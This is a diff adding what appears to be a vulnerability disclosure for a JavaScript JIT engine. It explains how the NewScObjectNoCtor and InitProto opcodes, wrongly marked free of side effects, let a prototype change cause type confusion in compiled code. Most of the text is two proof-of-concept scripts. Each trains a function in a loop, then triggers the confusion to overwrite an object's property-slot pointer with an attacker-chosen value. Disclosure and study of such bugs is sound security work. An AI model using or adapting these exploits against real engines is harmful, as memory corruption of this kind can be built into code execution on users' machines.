@@ -1,0 +1,61 @@
+NewScObjectNoCtor and InitProto opcodes are treated as having no side effects, but actually they can have via the SetIsPrototype method of the type handler that can cause transition to a new type. This can lead to type confusion in the JITed code.
+
+In the PoC, it overwrites the pointer to property slots with 0x1000000001234. 
+
+PoC for NewScObjectNoCtor:
+
+function cons() {
+
+}
+
+function opt(o, value) {
+    o.b = 1;
+
+    new cons();
+
+    o.a = value;
+}
+
+function main() {
+    for (let i = 0; i < 2000; i++) {
+        cons.prototype = {};
+
+        let o = {a: 1, b: 2};
+        opt(o, {});
+    }
+
+    let o = {a: 1, b: 2};
+
+    cons.prototype = o;
+
+    opt(o, 0x1234);
+
+    print(o.a);
+}
+
+main();
+
+PoC for InitProto:
+
+function opt(o, proto, value) {
+    o.b = 1;
+
+    let tmp = {__proto__: proto};
+
+    o.a = value;
+}
+
+function main() {
+    for (let i = 0; i < 2000; i++) {
+        let o = {a: 1, b: 2};
+        opt(o, {}, {});
+    }
+
+    let o = {a: 1, b: 2};
+
+    opt(o, o, 0x1234);
+
+    print(o.a);
+}
+
+main();
